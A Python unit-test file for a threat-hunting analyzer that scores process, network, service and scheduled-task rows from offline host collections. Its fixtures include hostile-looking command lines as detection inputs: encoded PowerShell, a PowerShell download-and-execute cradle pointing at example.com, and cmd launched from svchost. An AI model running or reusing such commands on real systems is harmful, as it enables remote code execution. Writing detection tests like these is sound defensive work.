import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from app.modules.hunting_analysis import BaselineReview, MAX_FINDINGS
from app.modules.hunting_results import save_result, analyze_result

PREFIX = 'results/BroSec.Offline.Baseline/'


class AnalysisTests(unittest.TestCase):
    def test_behavior_chain_survives_detail_cap(self):
        review = BaselineReview()
        for i in range(MAX_FINDINGS + 1):
            review.consume(PREFIX + 'Processes.json', i, {'Exe': '/tmp/context'})
        index = MAX_FINDINGS + 2
        review.consume(PREFIX + 'Processes.json', index, {
            'Pid': 123, 'Exe': r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
            'CommandLine': 'powershell.exe -EncodedCommand ' + 'A' * 40})
        review.consume(PREFIX + 'Network.json', 0, {
            'Pid': 123, 'Status': 'ESTABLISHED', 'RemoteIP': '8.8.8.8'})
        result = review.result([])
        self.assertTrue(result['truncated'])
        self.assertEqual(result['triage_summary']['behavior_chains_total'], 1)
        chain = result['triage_summary']['behavior_chains'][0]
        self.assertFalse(chain['identity_verified'])
        self.assertEqual(chain['evidence_refs'][0]['row_number'], index + 1)
        self.assertTrue(any(x['rule_id'] == 'correlation.process_network' for x in result['finding_inventory']))

    def test_public_ip_and_path_do_not_create_behavior_chain(self):
        review = BaselineReview()
        review.consume(PREFIX + 'Processes.json', 0, {'Pid': 123, 'Exe': '/tmp/updater'})
        review.consume(PREFIX + 'Network.json', 0, {'Pid': 123, 'Status': 'ESTABLISHED', 'RemoteIP': '8.8.8.8'})
        result = review.result([])
        self.assertEqual(result['triage_summary']['behavior_chains_total'], 0)
        self.assertEqual(result['triage_summary']['behavioral_rows_total'], 0)

    def test_rules_and_evidence_offsets(self):
        review = BaselineReview()
        review.consume(PREFIX + 'Processes.json', 4, {'Exe': r'C:\Users\alice\AppData\Local\Temp\tool.exe'})
        review.consume(PREFIX + 'Network.json', 2, {'Status': 'LISTEN', 'LocalIP': '::', 'LocalPort': 3389})
        review.consume(PREFIX + 'Network.json', 3, {'Status': 'ESTABLISHED', 'RemoteIP': '8.8.8.8'})
        result = review.result([{'source': PREFIX + 'Processes.json'}, {'source': PREFIX + 'Network.json'}])
        self.assertEqual(result['matched_rules'], 3)
        self.assertEqual(result['findings'][0]['row_offset'], 4)
        self.assertEqual(result['findings'][0]['row_number'], 5)
        self.assertEqual(result['verdict'], 'not_determined')
        self.assertEqual(result['missing_sources'], ['Host'])

    def test_normal_rows_and_untrusted_types(self):
        review = BaselineReview()
        for row in [{'Exe': '/usr/bin/sshd'}, {'Exe': None}, {'Exe': ['bad']}, {}]:
            review.consume(PREFIX + 'Processes.json', 0, row)
        for row in [
            {'Status': 'ESTABLISHED', 'RemoteIP': '10.0.0.1'},
            {'Status': 'LISTEN', 'RemoteIP': '8.8.8.8'},
            {'Status': 'LISTEN', 'LocalIP': '127.0.0.1', 'LocalPort': 22},
            {'Status': 'LISTEN', 'LocalIP': '::', 'LocalPort': [22]},
            {'Status': 'ESTABLISHED', 'RemoteIP': ['8.8.8.8']},
        ]:
            review.consume(PREFIX + 'Network.json', 0, row)
        review.consume('results/untrusted.json', 0, {'Exe': '/tmp/tool'})
        self.assertEqual(review.matches, 0)
        self.assertEqual(review.result([])['unsupported_sources'], ['results/untrusted.json'])

    def test_bounded_output_and_empty_sources(self):
        review = BaselineReview()
        for i in range(MAX_FINDINGS + 10):
            review.consume(PREFIX + 'Processes.json', i, {'Exe': '/dev/shm/tool'})
        result = review.result([{'source': PREFIX + 'Host.json'}])
        self.assertEqual(len(result['findings']), MAX_FINDINGS)
        self.assertTrue(result['truncated'])
        self.assertEqual(result['matched_rules'], MAX_FINDINGS + 10)
        self.assertEqual(result['empty_sources'], ['Host'])

    def test_real_encrypted_archive_analysis(self):
        from test_hunting_ingest import IngestTests
        from app.modules.hunting_ingest import summarize_container
        fixture = IngestTests()
        fixture.setUp()
        try:
            data = fixture.container(PREFIX + 'Processes.json', b'{"Exe":"/tmp/test-tool"}\n')
            base = fixture.root / 'store'
            summary = summarize_container(data, fixture.root, 1)
            item = save_result(base, 1, data, summary)
            result = analyze_result(base, fixture.root, 1, item['id'])
            self.assertEqual(result['matched_rules'], 1)
            self.assertEqual(result['findings'][0]['source'], PREFIX + 'Processes.json')
        finally:
            fixture.doCleanups()

    def test_tenant_and_integrity_before_parsing(self):
        with tempfile.TemporaryDirectory() as temp:
            base = Path(temp)
            item = save_result(base, 1, b'encrypted', {'sources': [], 'total_rows': 0})
            def parse(data, keys, company_id, row_callback):
                row_callback(PREFIX + 'Processes.json', 0, {'Exe': '/tmp/tool'})
                return {'sources': [{'source': PREFIX + 'Processes.json', 'rows': 1}]}
            with patch('app.modules.hunting_results.summarize_container', side_effect=parse) as parser:
                with self.assertRaises(KeyError):
                    analyze_result(base, base / 'keys', 2, item['id'])
                parser.assert_not_called()
                result = analyze_result(base, base / 'keys', 1, item['id'])
                self.assertEqual(result['matched_rules'], 1)
                self.assertEqual(result['sha256'], item['sha256'])
                parser.reset_mock()
                (base / 'archives/1' / (item['id'] + '.zip')).write_bytes(b'tampered')
                with self.assertRaises(ValueError):
                    analyze_result(base, base / 'keys', 1, item['id'])
                parser.assert_not_called()


class CorrelationEvidenceTests(unittest.TestCase):
    def analyze(self, processes, networks=None, services=None):
        r=BaselineReview()
        for kind,rows in [('Processes',processes),('Network',networks or []),('Services',services or [])]:
            for i,row in enumerate(rows):r.consume(PREFIX+kind+'.json',i,row)
        return r.result([])
    def test_normal_process_network_is_context_not_high_alert(self):
        r=self.analyze([{'Pid':1,'Exe':'/usr/bin/browser'}],[{'Pid':1,'Status':'ESTABLISHED','RemoteIP':'8.8.8.8'}])
        self.assertNotIn('correlation.process_network',[f['rule_id'] for f in r['findings']])
    def test_exact_process_citation(self):
        r=self.analyze([{'Pid':1,'Exe':'/tmp/tool'}],[{'Pid':1,'Status':'ESTABLISHED','RemoteIP':'8.8.8.8'}])
        f=next(f for f in r['findings'] if f['rule_id']=='correlation.process_network')
        self.assertEqual(f['evidence_refs'][1]['source'],PREFIX+'Processes.json')
        self.assertEqual(f['evidence']['Pid'],1)
    def test_duplicate_pid_no_correlation(self):
        r=self.analyze([{'Pid':1,'Exe':'/tmp/a'},{'Pid':1,'Exe':'/tmp/b'}],[{'Pid':1,'Status':'ESTABLISHED','RemoteIP':'8.8.8.8'}])
        self.assertEqual(r['ambiguous_process_ids'],1)
        self.assertNotIn('correlation.process_network',[f['rule_id'] for f in r['findings']])
    def test_path_substring_is_not_identity(self):
        r=self.analyze([{'Pid':1,'Exe':r'C:\Temp\a.exe'}],services=[{'PathName':r'C:\Temp\a.exe.evil'}])
        self.assertNotIn('correlation.process_persistence',[f['rule_id'] for f in r['findings']])

class GraphAndIocTests(unittest.TestCase):
    def test_graph_edges_and_ioc_citations(self):
        review=BaselineReview()
        review.consume(PREFIX+'Processes.json',0,{'Pid':7,'Exe':'/tmp/tool'})
        review.consume(PREFIX+'Network.json',1,{'Pid':7,'Status':'ESTABLISHED','RemoteIP':'8.8.8.8','RemotePort':443})
        review.consume(PREFIX+'Network.json',2,{'Status':'ESTABLISHED','RemoteIP':'10.0.0.1'})
        result=review.result([{'source':PREFIX+'Processes.json','rows':1},{'source':PREFIX+'Network.json','rows':2}])
        self.assertTrue(any(edge['relation']=='network_connection' for edge in result['graph']['edges']))
        ioc=next(item for item in result['iocs'] if item['value']=='8.8.8.8')
        self.assertEqual(ioc['evidence_refs'][0]['row_number'],2)
        self.assertEqual(result['graph']['nodes'][0]['kind'], 'process')
    def test_graph_does_not_link_ambiguous_pid(self):
        review=BaselineReview()
        review.consume(PREFIX+'Processes.json',0,{'Pid':7,'Exe':'/tmp/a'})
        review.consume(PREFIX+'Processes.json',1,{'Pid':7,'Exe':'/tmp/b'})
        review.consume(PREFIX+'Network.json',2,{'Pid':7,'Status':'ESTABLISHED','RemoteIP':'8.8.8.8'})
        result=review.result([])
        self.assertFalse(any(edge['relation']=='network_connection' for edge in result['graph']['edges']))

class HighSignalDetectionTests(unittest.TestCase):
    def test_parent_child_and_public_process_signal(self):
        review=BaselineReview()
        review.consume(PREFIX+'Processes.json',0,{'Pid':10,'Ppid':1,'Name':'tool','Exe':'/tmp/tool'})
        review.consume(PREFIX+'Processes.json',1,{'Pid':1,'Ppid':0,'Name':'init','Exe':'/sbin/init'})
        review.consume(PREFIX+'Network.json',2,{'Pid':10,'Status':'ESTABLISHED','RemoteIP':'8.8.8.8','RemotePort':443})
        result=review.result([])
        self.assertTrue(any(e['relation']=='parent_child' for e in result['graph']['edges']))
        self.assertIn('network.public_peer_with_process',[f['rule_id'] for f in result['findings']])
    def test_private_process_connection_is_not_public_signal(self):
        review=BaselineReview();review.consume(PREFIX+'Processes.json',0,{'Pid':10,'Exe':'/tmp/tool'});review.consume(PREFIX+'Network.json',1,{'Pid':10,'Status':'ESTABLISHED','RemoteIP':'10.0.0.5'})
        result=review.result([])
        self.assertNotIn('network.public_peer_with_process',[f['rule_id'] for f in result['findings']])

class BehavioralDetectionTests(unittest.TestCase):
    def test_encoded_powershell_is_review_signal(self):
        review=BaselineReview();review.consume(PREFIX+'Processes.json',0,{'Pid':10,'Exe':r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe','CommandLine':'powershell.exe -EncodedCommand SQBFAFgAIAAtAG4AbwBwAA=='})
        result=review.result([]);self.assertIn('process.encoded_powershell',[f['rule_id'] for f in result['findings']]);self.assertEqual(next(f for f in result['findings'] if f['rule_id']=='process.encoded_powershell')['classification'], 'review')
    def test_service_parent_spawning_shell_is_review_signal(self):
        review=BaselineReview();review.consume(PREFIX+'Processes.json',0,{'Pid':4,'Ppid':1,'Exe':r'C:\Windows\System32\svchost.exe'});review.consume(PREFIX+'Processes.json',1,{'Pid':10,'Ppid':4,'Exe':r'C:\Windows\System32\cmd.exe','CommandLine':'cmd.exe /c whoami'})
        result=review.result([]);self.assertIn('process.anomalous_parent_child',[f['rule_id'] for f in result['findings']])
    def test_lolbin_without_commandline_is_not_emitted(self):
        review=BaselineReview();review.consume(PREFIX+'Processes.json',0,{'Pid':10,'Exe':r'C:\Windows\System32\cmd.exe'});self.assertNotIn('process.lolbin_execution',[f['rule_id'] for f in review.result([])['findings']])

class NetworkShapeTests(unittest.TestCase):
    def test_alternate_velociraptor_field_names_create_edges(self):
        review=BaselineReview();review.consume(PREFIX+'Processes.json',0,{'PID':'10','PPid':'1','Exe':'/tmp/tool'});review.consume(PREFIX+'Network.json',1,{'PID':'10','Status':'ESTABLISHED','RemoteAddr':'8.8.8.8','RemotePortNumber':'443'})
        result=review.result([])
        self.assertTrue(any(e['relation']=='network_connection' for e in result['graph']['edges']))
        self.assertIn('network.public_peer_with_process',[f['rule_id'] for f in result['findings']])
    def test_null_network_endpoints_do_not_create_ioc(self):
        review=BaselineReview();review.consume(PREFIX+'Network.json',0,{'Pid':10,'Status':'LISTEN','LocalIP':None,'RemoteIP':None});result=review.result([])
        self.assertEqual(result['iocs'],[])


class ContextualDetectionRegressionTests(unittest.TestCase):
    def analyze(self, rows):
        review = BaselineReview()
        for kind, index, row in rows:
            review.consume(PREFIX + kind + '.json', index, row)
        return review.result([])

    def test_high_linux_pid_and_alternate_remote_ip_preserve_evidence(self):
        result = self.analyze([
            ('Processes', 3, {'PID': '1048576', 'PPid': '70000', 'Exe': '/tmp/tool'}),
            ('Processes', 4, {'Pid': 70000, 'Exe': '/sbin/init'}),
            ('Network', 8, {'PID': '1048576', 'Status': 'ESTABLISHED', 'RemoteAddr': '8.8.8.8'}),
        ])
        evidence = result['triage_summary']['process_network_evidence'][0]
        self.assertEqual(evidence['remote_ip'], '8.8.8.8')
        self.assertEqual(evidence['pid'], 1048576)
        self.assertEqual((evidence['process_row_number'], evidence['network_row_number']), (4, 9))
        self.assertIn({'source': 'process:70000', 'target': 'process:1048576', 'relation': 'parent_child', 'confidence': 'snapshot_pid'}, result['graph']['edges'])
        finding = next(f for f in result['findings'] if f['rule_id'] == 'network.public_peer_with_process')
        self.assertEqual(finding['evidence_refs'], [
            {'source': PREFIX + 'Network.json', 'row_number': 9, 'relation': 'rule_match'},
            {'source': PREFIX + 'Processes.json', 'row_number': 4, 'relation': 'snapshot_pid'},
        ])
        self.assertEqual(finding['evidence']['RemoteAddr'], '8.8.8.8')

    def test_pid_parser_is_separate_from_port_range(self):
        for value in (True, -1, 1.2, '1.2', '9' * 5000, 2**32):
            with self.subTest(value=str(value)[:30]):
                self.assertIsNone(BaselineReview._number({'Pid': value}, 'Pid'))
        self.assertEqual(BaselineReview._number({'Pid': '70000'}, 'Pid'), 70000)
        self.assertIsNone(BaselineReview._number({'LocalPort': 70000}, 'LocalPort', maximum=65535))

    def test_benign_interpreters_stay_context_even_with_public_peer(self):
        for exe, command in [
            ('powershell.exe', 'powershell.exe -NoProfile -Command Get-Date'),
            ('pwsh.exe', 'pwsh.exe -File C:\\Admin\\inventory.ps1'),
            ('cmd.exe', 'cmd.exe /c whoami'),
            ('certutil.exe', 'certutil.exe -hashfile C:\\Admin\\file.exe SHA256'),
            ('powershell.exe', 'powershell.exe -Command Invoke-WebRequest https://example.com -OutFile report.txt'),
        ]:
            with self.subTest(command=command):
                result = self.analyze([
                    ('Processes', 0, {'Pid': 10, 'Exe': 'C:\\Windows\\System32\\' + exe, 'CommandLine': command}),
                    ('Network', 1, {'Pid': 10, 'Status': 'ESTABLISHED', 'RemoteIP': '8.8.8.8'}),
                ])
                self.assertTrue(any(f['rule_id'] == 'process.lolbin_execution' for f in result['findings']))
                self.assertFalse(any(f['triage_level'] == 'high' for f in result['findings']))
                self.assertEqual(result['verdict'], 'not_determined')
                self.assertFalse(any('beacon' in f['rule_id'] for f in result['findings']))

    def test_remote_script_execution_is_review_not_compromise_verdict(self):
        result = self.analyze([('Processes', 2, {
            'Exe': r'C:\Windows\System32\powershell.exe',
            'CommandLine': "powershell.exe -Command IEX ((New-Object Net.WebClient).DownloadString('https://example.com/a.ps1'))",
        })])
        finding = next(f for f in result['findings'] if f['rule_id'] == 'process.suspicious_invocation')
        self.assertEqual(finding['classification'], 'review')
        self.assertEqual(finding['evidence_refs'], [{'source': PREFIX + 'Processes.json', 'row_number': 3, 'relation': 'rule_match'}])
        self.assertEqual(result['verdict'], 'not_determined')

    def test_service_pathname_encoded_invocation_has_strict_citation(self):
        path = r'"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand SQBFAFgAIAAtAG4AbwBwAA=='
        result = self.analyze([('Services', 6, {'Name': 'ReviewMe', 'PathName': path})])
        finding = next(f for f in result['findings'] if f['rule_id'] == 'persistence.service_suspicious_invocation')
        self.assertEqual(finding['classification'], 'review')
        self.assertEqual(finding['evidence']['PathName'], path)
        self.assertEqual(finding['evidence_refs'], [{'source': PREFIX + 'Services.json', 'row_number': 7, 'relation': 'rule_match'}])
        self.assertEqual(result['verdict'], 'not_determined')

    def test_task_commands_arguments_and_actions(self):
        import json
        command = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
        arguments = '-EncodedCommand SQBFAFgAIAAtAG4AbwBwAA=='
        action = {'Command': command, 'Arguments': arguments}
        for task in [action, {'Actions': [action]}, {'Actions': {'Exec': action}}, {'Actions': json.dumps([action])}]:
            with self.subTest(task=task):
                result = self.analyze([
                    ('Tasks', 5, dict(task, TaskName='ReviewMe')),
                    ('Processes', 8, {'Pid': 70001, 'Exe': command}),
                ])
                finding = next(f for f in result['findings'] if f['rule_id'] == 'persistence.task_suspicious_invocation')
                self.assertEqual(finding['classification'], 'review')
                self.assertEqual(finding['evidence_refs'], [{'source': PREFIX + 'Tasks.json', 'row_number': 6, 'relation': 'rule_match'}])
                self.assertEqual(finding['evidence'].get('Actions', finding['evidence'].get('Arguments')), task.get('Actions', arguments))
                self.assertTrue(any(e['relation'] == 'executes' for e in result['graph']['edges']))
                correlated = next(f for f in result['findings'] if f['rule_id'] == 'correlation.process_persistence')
                self.assertEqual(correlated['evidence_refs'][1], {'source': PREFIX + 'Processes.json', 'row_number': 9, 'relation': 'executable_path'})

    def test_benign_persistence_and_untrusted_actions_do_not_raise_high(self):
        for kind, row in [
            ('Services', {'PathName': r'"C:\Windows\System32\cmd.exe" /c echo ready'}),
            ('Tasks', {'Command': 'powershell.exe', 'Arguments': '-Command Get-Date'}),
            ('Tasks', {'Actions': [{'Command': 'cmd.exe', 'Arguments': '/c echo ready'}]}),
            ('Tasks', {'Actions': ['powershell.exe -EncodedCommand SQBFAFgAIAAtAG4AbwBwAA==']}),
            ('Tasks', {'Actions': {'Description': 'powershell.exe -EncodedCommand SQBFAFgAIAAtAG4AbwBwAA=='}}),
            ('Tasks', {'Command': ['bad'], 'Arguments': {'bad': 1}, 'Actions': None}),
        ]:
            with self.subTest(row=row):
                self.assertFalse(any(f['triage_level'] == 'high' for f in self.analyze([(kind, 0, row)])['findings']))


    def test_single_heuristic_rules_are_not_presented_as_high_priority(self):
        cases = [
            [('Processes', 0, {'Pid': 10, 'Exe': r'C:\Users\alice\AppData\Local\Temp\tool.exe'})],
            [('Processes', 0, {'Pid': 10, 'Exe': r'C:\Windows\System32\powershell.exe', 'CommandLine': 'powershell.exe -EncodedCommand SQBFAFgAIAAtAG4AbwBwAA=='})],
            [('Network', 0, {'Pid': 10, 'Status': 'ESTABLISHED', 'RemoteIP': '8.8.8.8'})],
            [('Tasks', 0, {'Command': r'C:\Users\alice\AppData\Local\updater.exe'})],
        ]
        for rows in cases:
            with self.subTest(rows=rows):
                result = self.analyze(rows)
                self.assertTrue(result['findings'])
                self.assertTrue(all(f['triage_level'] in {'low', 'medium'} for f in result['findings']))

    def test_task_actions_transient_path_is_detected(self):
        result = self.analyze([('Tasks', 0, {'Actions': [{'Command': r'C:\Users\alice\AppData\Local\tool.exe', 'Arguments': '--run'}]})])
        self.assertIn('persistence.task_transient_path', [f['rule_id'] for f in result['findings']])

    def test_persistence_executable_paths_with_spaces_are_exact(self):
        exe = r'C:\Program Files\Admin Tools\powershell.exe'
        args = '-EncodedCommand SQBFAFgAIAAtAG4AbwBwAA=='
        for kind, row in [
            ('Services', {'PathName': '"' + exe + '" ' + args}),
            ('Tasks', {'Command': exe, 'Arguments': args}),
            ('Tasks', {'Actions': [{'Command': exe, 'Arguments': args}]}),
        ]:
            with self.subTest(kind=kind, row=row):
                result = self.analyze([(kind, 0, row), ('Processes', 1, {'Pid': 70000, 'Exe': exe})])
                self.assertTrue(any(e['relation'] == 'executes' for e in result['graph']['edges']))
                self.assertIn('correlation.process_persistence', [f['rule_id'] for f in result['findings']])
                wrong = self.analyze([(kind, 0, row), ('Processes', 1, {'Pid': 70000, 'Exe': exe + '.evil'})])
                self.assertFalse(any(e['relation'] == 'executes' for e in wrong['graph']['edges']))
                self.assertNotIn('correlation.process_persistence', [f['rule_id'] for f in wrong['findings']])

    def test_late_duplicate_pid_suppresses_all_network_correlations(self):
        result = self.analyze([
            ('Processes', 0, {'Pid': 70001, 'Exe': '/tmp/tool'}),
            ('Network', 1, {'Pid': 70001, 'Status': 'ESTABLISHED', 'RemoteIP': '8.8.8.8'}),
            ('Processes', 2, {'Pid': 70001, 'Exe': '/usr/bin/browser'}),
        ])
        rules = [f['rule_id'] for f in result['findings']]
        self.assertNotIn('network.public_peer_with_process', rules)
        self.assertNotIn('correlation.process_network', rules)
        self.assertFalse(result['triage_summary']['process_network_evidence'])
        self.assertFalse(any(e['relation'] == 'network_connection' for e in result['graph']['edges']))

    def test_parent_cycles_self_and_missing_parents_do_not_create_edges(self):
        for processes in [
            [{'Pid': 70000, 'Ppid': 70001, 'Exe': '/bin/a'}, {'Pid': 70001, 'Ppid': 70000, 'Exe': '/bin/b'}],
            [{'Pid': 70000, 'Ppid': 70000, 'Exe': '/bin/a'}],
            [{'Pid': 70000, 'Ppid': 70001, 'Exe': '/bin/a'}],
            [{'Pid': 70000, 'Ppid': 70001, 'Exe': '/bin/a'}, {'Pid': 70001, 'Exe': '/bin/b'}, {'Pid': 70001, 'Exe': '/bin/c'}],
        ]:
            with self.subTest(processes=processes):
                result = self.analyze([('Processes', i, row) for i, row in enumerate(processes)])
                self.assertFalse(any(e['relation'] == 'parent_child' for e in result['graph']['edges']))

if __name__ == '__main__':
    unittest.main()
